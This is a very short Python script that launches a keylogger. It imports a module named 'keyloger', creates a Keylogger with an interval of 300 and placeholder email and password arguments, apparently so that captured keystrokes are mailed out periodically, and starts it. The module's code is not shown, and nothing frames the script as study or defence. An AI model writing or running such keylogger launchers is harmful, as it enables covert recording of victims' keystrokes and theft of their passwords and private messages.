#!/usr/bin/env python

import keyloger

my_keylogger = keyloger.Keylogger(300, "email", "password")
my_keylogger.start()
